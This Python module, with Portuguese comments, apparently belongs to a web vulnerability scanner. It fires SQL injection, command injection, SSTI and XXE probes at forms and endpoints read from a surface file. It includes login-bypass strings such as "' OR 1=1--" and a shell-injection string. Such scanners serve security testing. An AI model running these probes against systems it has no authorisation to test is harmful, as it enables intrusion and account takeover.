"""
runner.py — InjectionScanner
Testa SQLi (error + time-based), Command Injection, SSTI e XXE
em formulários, endpoints e APIs extraídos do attack_surface.json.
"""

from __future__ import annotations

import json
import base64
import os
import ssl
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

from . import payloads as P
from modules.utils.http_client import HttpClient
from modules.utils.logger import buggy_logger

TIMEOUT = 12  # segundos por request normal
TIME_THRESHOLD = 3.2  # segundos — threshold para time-based SQLi

def _inject_get_param(url: str, param: str, value: str) -> str:
    """Substitui ou adiciona `param=value` na query string."""
    parsed = urllib.parse.urlparse(url)
    qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_qs = urllib.parse.urlencode(qs, doseq=True)
    return parsed._replace(query=new_qs).geturl()


def _contains_any(text: str, markers: list[str]) -> str | None:
    tl = text.lower()
    for m in markers:
        if m.lower() in tl:
            return m
    return None


# ── SQLi ──────────────────────────────────────────────────────────────────────

def _test_sqli_error(client: HttpClient, url: str, param: str, via: str = "GET") -> dict | None:
    baseline = client.get(url)
    baseline_hits = {
        marker.lower() for marker in P.SQLI_ERROR_PATTERNS
        if marker.lower() in baseline.body.lower()
    }
    for payload in P.SQLI_ERROR[:10]:   # limite de payloads por param
        injected_url = _inject_get_param(url, param, payload)
        resp = client.get(injected_url)
        hit = _contains_any(resp.body, P.SQLI_ERROR_PATTERNS)
        if hit and hit.lower() not in baseline_hits:
            return {
                "type":       "sqli",
                "url":        injected_url,
                "parameter":  param,
                "payload":    payload,
                "evidence":   hit,
                "confidence": "high",
                "via":        via,
            }
    return None


def _test_sqli_time(client: HttpClient, url: str, param: str) -> dict | None:
    # Baseline
    baseline = client.get(url)

    for payload in P.SQLI_TIME[:6]:
        injected_url  = _inject_get_param(url, param, payload)
        # Using a specialized client config for this if we wanted, but the global handles timeouts
        resp = client.get(injected_url)
        if resp.elapsed >= TIME_THRESHOLD and resp.elapsed >= baseline.elapsed + 2.5:
            confirmation = client.get(injected_url)
            if confirmation.elapsed < TIME_THRESHOLD or confirmation.elapsed < baseline.elapsed + 2.5:
                continue
            return {
                "type":       "sqli_blind",
                "url":        injected_url,
                "parameter":  param,
                "payload":    payload,
                "evidence":   (f"Two delayed responses: {resp.elapsed:.1f}s and "
                               f"{confirmation.elapsed:.1f}s (baseline {baseline.elapsed:.1f}s)"),
                "confidence": "high",
            }
    return None


# ── Command Injection ─────────────────────────────────────────────────────────

def _test_cmdi(client: HttpClient, url: str, param: str) -> dict | None:
    baseline = client.get(url)
    encoded = base64.b64encode(P.CANARY.encode()).decode()
    output_payload = f"; printf {encoded} | base64 -d"
    blind_payloads = [payload for payload in P.CMD_PAYLOADS if "sleep" in payload or "ping" in payload]

    for payload in [output_payload, *blind_payloads[:4]]:
        injected_url = _inject_get_param(url, param, payload)
        resp = client.get(injected_url)

        # The plaintext marker is not present in output_payload, so reflection
        # alone cannot satisfy this check.
        if P.CANARY not in baseline.body and P.CANARY not in payload and P.CANARY in resp.body:
            return {
                "type":       "command_injection",
                "url":        injected_url,
                "parameter":  param,
                "payload":    payload,
                "evidence":   P.CANARY,
                "confidence": "high",
            }
            
        # Blind (Time-based)
        if "sleep" in payload or "ping" in payload:
            if resp.elapsed >= 4.5 and resp.elapsed >= baseline.elapsed + 4.5:
                 return {
                    "type":       "command_injection_blind",
                    "url":        injected_url,
                    "parameter":  param,
                    "payload":    payload,
                    "evidence":   f"Response delayed {resp.elapsed:.1f}s (baseline {baseline.elapsed:.1f}s)",
                    "confidence": "medium",
                }
    return None


# ── SSTI ──────────────────────────────────────────────────────────────────────

def _test_ssti(client: HttpClient, url: str, param: str) -> dict | None:
    baseline = client.get(url)
    strong_checks = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
    ]
    for payload, expected in strong_checks:
        injected_url = _inject_get_param(url, param, payload)
        resp = client.get(injected_url)
        baseline_count = baseline.body.count(expected)
        response_count = resp.body.count(expected)
        reflected_only = payload.lower() in resp.body.lower()
        if response_count > baseline_count and not reflected_only:
            return {
                "type":       "ssti",
                "url":        injected_url,
                "parameter":  param,
                "payload":    payload,
                "evidence":   f"template expression evaluated to {expected}",
                "confidence": "high",
            }
    return None


# ── XXE ───────────────────────────────────────────────────────────────────────

def _test_xxe(client: HttpClient, url: str) -> dict | None:
    for xml_payload in P.XXE_PAYLOADS[:3]:
        resp = client.post_xml(url, xml_payload)
        hit = _contains_any(resp.body, P.XXE_MARKERS)
        if hit:
            return {
                "type":       "xxe",
                "url":        url,
                "parameter":  "xml_body",
                "payload":    xml_payload[:200],
                "evidence":   hit,
                "confidence": "high",
            }
    return None


def _contains_auth_token(body: str) -> bool:
    try:
        payload = json.loads(body)
    except (TypeError, json.JSONDecodeError):
        return False

    def walk(value) -> bool:
        if isinstance(value, dict):
            for key, item in value.items():
                normalized = str(key).lower().replace("-", "_")
                if normalized in {"token", "access_token", "id_token", "jwt"}:
                    if isinstance(item, str) and len(item) >= 12:
                        return True
                if walk(item):
                    return True
        elif isinstance(value, list):
            return any(walk(item) for item in value)
        return False

    return walk(payload)


def _test_json_login_sqli(client: HttpClient, url: str) -> dict | None:
    """Confirm auth bypass only when injection uniquely returns an auth token."""
    baseline = client.post_json(url, {
        "email": f"buggy-invalid-{time.time_ns()}@invalid.local",
        "password": "buggy-invalid-password",
    })
    if _contains_auth_token(baseline.body):
        return None
    for payload in ("' OR 1=1--", "' OR true--"):
        response = client.post_json(url, {
            "email": payload,
            "password": "buggy-invalid-password",
        })
        if 200 <= response.status < 300 and _contains_auth_token(response.body):
            return {
                "type": "sqli",
                "subtype": "authentication_bypass",
                "url": url,
                "parameter": "email",
                "payload": payload,
                "evidence": "authentication token returned only for injected identity",
                "confidence": "confirmed",
                "via": "POST JSON",
            }
    return None


# ── Form-based injection ──────────────────────────────────────────────────────

def _test_form(client: HttpClient, form: dict) -> list[dict]:
    """Testa SQLi + SSTI em todos os campos de um form."""
    url    = form.get("action", "") or form.get("url", "")
    method = (form.get("method", "GET") or "GET").upper()
    fields = form.get("fields", []) or form.get("inputs", [])
    findings = []

    if not url:
        return findings

    for field in fields:
        name = field if isinstance(field, str) else field.get("name", "")
        if not name:
            continue

        # SQLi error
        payload = "'"
        data    = {name: payload}
        if method == "POST":
            resp = client.post_form(url, data)
        else:
            resp = client.get(_inject_get_param(url, name, payload))

        if _contains_any(resp.body, P.SQLI_ERROR_PATTERNS):
            findings.append({
                "type": "sqli", "url": url, "parameter": name,
                "payload": payload, "evidence": "sql error in response",
                "confidence": "high", "via": method,
            })
            continue   # já confirmado, pula outros payloads

        # SSTI
        for pl in P.SSTI_PAYLOADS[:3]:
            if method == "POST":
                resp = client.post_form(url, {name: pl})
            else:
                resp = client.get(_inject_get_param(url, name, pl))
            hit = _contains_any(resp.body, P.SSTI_MARKERS)
            if hit:
                findings.append({
                    "type": "ssti", "url": url, "parameter": name,
                    "payload": pl, "evidence": hit,
                    "confidence": "high", "via": method,
                })
                break

    return findings


# ── Scanner principal ─────────────────────────────────────────────────────────

class InjectionScanner:
    def __init__(self, target: str, output_dir: str):
        self.target     = target
        self.output_dir = Path(output_dir)
        self.attack_dir = self.output_dir / "attacks" / "injection"
        self.attack_dir.mkdir(parents=True, exist_ok=True)
        self.findings: list[dict] = []

    def _load_surface(self) -> dict:
        p = self.output_dir / "surface" / "attack_surface.json"
        if p.exists():
            with open(p) as f:
                return json.load(f)
        return {}

    def _save(self):
        from modules.Report import score_bulk
        if self.findings:
            self.findings = score_bulk(self.findings)
        out = self.attack_dir / "findings.json"
        with open(out, "w") as f:
            json.dump(self.findings, f, indent=2)
        # Append findings into attack_surface.json
        surface_file = self.output_dir / "surface" / "attack_surface.json"
        if surface_file.exists():
            with open(surface_file) as f:
                surface = json.load(f)
            surface["injection_findings"] = self.findings
            with open(surface_file, "w") as f:
                json.dump(surface, f, indent=2)

    def _collect_targets(self, surface: dict) -> list[tuple[str, str]]:
        """Retorna lista de (url, param) para testar."""
        targets: list[tuple[str, str]] = []

        # Endpoints com parâmetros GET
        for ep in surface.get("injection_targets", {}).get("search_endpoints", []):
            url = str(ep)
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                targets.append((url, param))

        # Admin / login pages — testa parâmetros comuns
        for ep in surface.get("injection_targets", {}).get("login_pages", []):
            url = str(ep)
            for param in ["user", "username", "email", "id", "q", "search", "name"]:
                targets.append((url, param))

        return targets[:60]   # cap de segurança

    def exec(self, threads: int = 20, timeout: float = 10.0):
        buggy_logger.info(f"\n{'='*60}")
        buggy_logger.info(f"  InjectionScanner — {self.target}")
        buggy_logger.info(f"{'='*60}\n")

        surface = self._load_surface()
        if not surface:
            buggy_logger.warning("  ⚠️  attack_surface.json não encontrado — rode surface primeiro")
            return

        client = HttpClient(timeout=timeout)
        tasks: list[tuple] = []   # (type, *args)

        # Coleta alvos de parâmetros GET
        targets = self._collect_targets(surface)
        buggy_logger.info(f"  [+] {len(targets)} parâmetros GET para testar")

        for url, param in targets:
            tasks.append(("sqli_error", url, param))
            tasks.append(("sqli_time",  url, param))
            tasks.append(("cmdi",       url, param))
            tasks.append(("ssti",       url, param))

        # Forms
        forms = surface.get("injection_targets", {}).get("forms", [])
        buggy_logger.info(f"  [+] {len(forms)} formulários para testar")
        for form in forms[:30]:
            tasks.append(("form", form))

        # APIs — preserve method hints extracted from JavaScript bundles.
        api_entries = surface.get("api_endpoints", [])[:100]
        for api in api_entries:
            url = api.get("url", "") if isinstance(api, dict) else str(api)
            method = str(api.get("method", "UNKNOWN")).upper() if isinstance(api, dict) else "UNKNOWN"
            lowered = url.lower()
            if url and method == "POST" and any(key in lowered for key in ("login", "signin", "auth")):
                tasks.append(("api_login_sqli", url))

        writable_apis = [
            api for api in api_entries
            if isinstance(api, dict) and str(api.get("method", "")).upper() in {"POST", "PUT", "PATCH"}
        ]
        for api in writable_apis[:10]:
            url = str(api.get("url", ""))
            if url:
                tasks.append(("xxe", url))

        buggy_logger.info(f"  [+] {len(tasks)} tarefas totais\n")

        def _run_task(task: tuple) -> list[dict]:
            kind = task[0]
            try:
                if kind == "sqli_error":
                    r = _test_sqli_error(client, task[1], task[2])
                    return [r] if r else []
                elif kind == "sqli_time":
                    r = _test_sqli_time(client, task[1], task[2])
                    return [r] if r else []
                elif kind == "cmdi":
                    r = _test_cmdi(client, task[1], task[2])
                    return [r] if r else []
                elif kind == "ssti":
                    r = _test_ssti(client, task[1], task[2])
                    return [r] if r else []
                elif kind == "form":
                    return _test_form(client, task[1])
                elif kind == "xxe":
                    r = _test_xxe(client, task[1])
                    return [r] if r else []
                elif kind == "api_login_sqli":
                    r = _test_json_login_sqli(client, task[1])
                    return [r] if r else []
            except Exception as e:
                buggy_logger.debug(f"Error in Injection task {kind} for {task[1]}: {e}")
            return []

        with ThreadPoolExecutor(max_workers=min(threads, 30)) as ex:
            futures = [ex.submit(_run_task, t) for t in tasks]
            done = 0
            for fut in as_completed(futures):
                results = fut.result()
                self.findings.extend(results)
                done += 1
                if done % 20 == 0:
                    buggy_logger.info(f"  ... {done}/{len(tasks)} tasks, {len(self.findings)} findings")

        self._save()

        buggy_logger.info(f"\n{'='*60}")
        buggy_logger.info(f"  ✅ Injection scan complete — {len(self.findings)} findings")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            count = sum(1 for f in self.findings if f.get("cvss_severity") == sev)
            if count:
                buggy_logger.info(f"     {sev}: {count}")
        buggy_logger.info(f"  📁 {self.attack_dir}/findings.json")
        buggy_logger.info(f"{'='*60}")

        return self.findings
